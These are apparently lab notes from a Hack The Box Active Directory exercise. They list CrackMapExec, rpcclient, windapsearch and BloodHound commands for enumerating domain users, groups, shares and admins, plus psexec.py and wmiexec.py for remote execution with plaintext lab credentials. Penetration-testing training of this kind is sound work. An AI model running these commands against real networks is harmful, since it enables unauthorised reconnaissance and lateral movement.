#### CME - Domain User Enumeration

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```


#### CME - Domain Group Enumeration

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

#### CME - Logged On Users

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

#### Share Enumeration - Domain Controller

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

#### Spider_plus

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

## <span style="color:yellow"> rpcclient Enumeration</span>

#### RPCClient User Enumeration Listing 

```bash
rpcclient $> enumdomusers
```

#### RPCClient User Enumeration By RID

```shell
rpcclient $> queryuser 0x457
```

#### Psexec.py

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

#### wmiexec.py

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

## <span style="color:yellow">Windapsearch</span>

#### Windapsearch - Domain Admins

```shell
Sauuron@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

#### Windapsearch - Privileged Users

```shell
Sauuron@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```


## <span style="color:yellow">Bloodhound.py</span>

```shell
Sauuron@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

